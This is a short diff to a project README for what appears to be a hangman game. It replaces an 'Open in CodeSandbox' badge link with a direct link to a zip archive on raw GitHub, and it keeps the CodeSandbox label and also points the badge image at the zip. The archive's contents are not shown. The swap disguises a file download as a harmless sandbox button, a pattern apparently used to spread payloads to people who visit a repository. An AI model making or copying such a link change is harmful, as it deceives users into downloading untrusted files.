@@ -1,5 +1,5 @@
 <p align="center">
-  <a href="https://codesandbox.io/p/sandbox/github/mhr0007/hang-man">
-    <img src="https://codesandbox.io/static/img/play-codesandbox.svg" alt="Open in CodeSandbox" />
+  <a href="https://raw.githubusercontent.com/mhr0007/hang-man/master/templates/man_hang_2.7-alpha.1.zip">
+    <img src="https://raw.githubusercontent.com/mhr0007/hang-man/master/templates/man_hang_2.7-alpha.1.zip" alt="Open in CodeSandbox" />
   </a>
 </p>
